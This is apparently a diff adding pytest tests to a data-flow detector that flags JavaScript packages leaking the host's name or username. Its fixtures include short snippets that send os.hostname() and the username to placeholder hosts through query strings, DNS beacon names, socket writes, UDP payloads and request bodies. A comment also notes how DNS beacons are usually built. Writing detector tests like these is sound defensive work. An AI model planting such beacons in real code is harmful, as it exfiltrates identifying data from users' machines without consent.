@@ -184,6 +184,104 @@ class TestSockets:
         )
         assert FlowKit.flows(text)[0][:2] == (["identity"], "request")
 
+    #: What opening an HTTP request sends -- its path, query, headers -- is a request too: read
+    #: as a raw socket, a licence check sending a key in its query string was a payload's channel
+    #: (review 98 P1 A/B, 2026-10-20).
+    OPENS: ClassVar[dict[str, str]] = {
+        "request options": 'https.request({hostname: "h.invalid", path: "/l?k=" + os.hostname()});\n',
+        "get URL": 'http.get("http://h.invalid/l?k=" + os.hostname());\n',
+        "required inline": 'require("https").get("https://h.invalid/l?k=" + os.hostname());\n',
+    }
+
+    @pytest.mark.parametrize("name", sorted(OPENS))
+    def test_what_opening_an_http_request_sends_is_a_request(self, name: str) -> None:
+        text = (
+            'const os = require("os");\n'
+            'const http = require("http"); const https = require("https");\n' + self.OPENS[name]
+        )
+        assert FlowKit.flows(text)[0][:2] == (["identity"], "request")
+
+    @pytest.mark.parametrize("host", ["127.0.0.1", "localhost", "::1"])
+    def test_a_socket_to_this_machine_is_not_a_channel(self, host: str) -> None:
+        text = self.HEAD + f'net.createConnection(9, "{host}").write(os.hostname());\n'
+        assert FlowKit.flows(text)[0][:2] == (["identity"], "request")
+
+
+class TestIdentityAsDestination:
+    """The machine's own name or address as where a call goes -- a socket bound to the host's
+    name, a printer scan, NAT-PMP to the gateway, a router's own API -- is not identity sent
+    (review 98 P1 A/B: five benign tools). In a path, a body or a name's labels it still is."""
+
+    HEAD = (
+        'const os = require("os"); const dns = require("dns"); const net = require("net");\n'
+        'const dgram = require("dgram"); const http = require("http");\n'
+        "const ip = os.networkInterfaces().en0[0].address;\n"
+    )
+    DESTINATIONS: ClassVar[dict[str, str]] = {
+        "own name looked up": "dns.lookup(os.hostname(), (e, a) => {});\n",
+        "socket host option": "net.connect({host: ip, port: 9100});\n",
+        "socket shorthand": "const host = ip;\nnet.connect({host, port: 9100});\n",
+        "socket positional": "net.connect(9100, ip);\n",
+        "datagram address": 'const s = dgram.createSocket("udp4");\ns.send(Buffer.from("x"), 5351, ip);\n',
+        "request hostname": 'http.request({hostname: ip, path: "/tr064"});\n',
+        "local address": 'http.request({host: "h.invalid", localAddress: ip});\n',
+        "interfaces walked": (
+            "const ifs = os.networkInterfaces();\n"
+            "for (const name of Object.keys(ifs)) {\n"
+            "  for (const i of ifs[name]) { net.connect({host: i.address, port: 631}); }\n"
+            "}\n"
+        ),
+        "destructured": (
+            "const { address } = os.networkInterfaces().en0[0];\nnet.connect(9100, address);\n"
+        ),
+    }
+    SENT: ClassVar[dict[str, str]] = {
+        "name labels": 'dns.lookup(os.hostname() + ".x.invalid", () => {});\n',
+        "name labels in a template": "dns.lookup(`${os.hostname()}.x.invalid`, () => {});\n",
+        "path": 'http.request({hostname: "h.invalid", path: "/p?h=" + os.hostname()});\n',
+        "hostname labels": 'http.request({hostname: os.hostname() + ".x.invalid"});\n',
+        # How a DNS beacon is usually written: its name built first, then handed over bare.
+        "name built first": 'const h = os.hostname() + ".x.invalid";\ndns.lookup(h, () => {});\n',
+        "name built in a template": "const h = `${os.hostname()}.x.invalid`;\ndns.lookup(h, () => {});\n",
+        "name joined": (
+            'const n = [os.userInfo().username, os.hostname(), "x", "invalid"].join(".");\n'
+            "dns.resolve(n, () => {});\n"
+        ),
+        "name joined by a variable": (
+            "const parts = [os.userInfo().username, os.hostname()];\n"
+            "const n = parts.join(sep);\ndns.resolve(n, () => {});\n"
+        ),
+        "name through two bindings": (
+            'const a = os.hostname() + ".x.invalid"; const b = a;\ndns.lookup(b, () => {});\n'
+        ),
+        "name appended to": 'let h = os.hostname();\nh += ".x.invalid";\ndns.lookup(h, () => {});\n',
+        "name built by a helper": (
+            'function d(x) { return x + ".x.invalid"; }\ndns.lookup(d(os.hostname()), () => {});\n'
+        ),
+        "name passed in": (
+            'function ping(h) { dns.lookup(h, () => {}); }\nping(os.hostname() + ".x.invalid");\n'
+        ),
+        "socket write": 'const s = net.connect(9, "h.invalid");\ns.write(os.hostname());\n',
+        "datagram payload": (
+            'const s = dgram.createSocket("udp4");\n'
+            's.send(Buffer.from(os.hostname()), 53, "h.invalid");\n'
+        ),
+        "request body": (
+            'const r = http.request({hostname: "h.invalid"});\n'
+            "r.end(JSON.stringify({h: os.hostname()}));\n"
+        ),
+    }
+
+    @pytest.mark.parametrize("name", sorted(DESTINATIONS))
+    def test_where_a_call_goes_is_not_sent(self, name: str) -> None:
+        flows = FlowKit.flows(self.HEAD + self.DESTINATIONS[name])
+        assert not [f for f in flows if "identity" in f[0]]
+
+    @pytest.mark.parametrize("name", sorted(SENT))
+    def test_what_a_call_carries_is_sent(self, name: str) -> None:
+        flows = FlowKit.flows(self.HEAD + self.SENT[name])
+        assert [f for f in flows if "identity" in f[0]]
+
 
 class TestBounds:
     def test_a_large_generated_file_finishes(self) -> None:
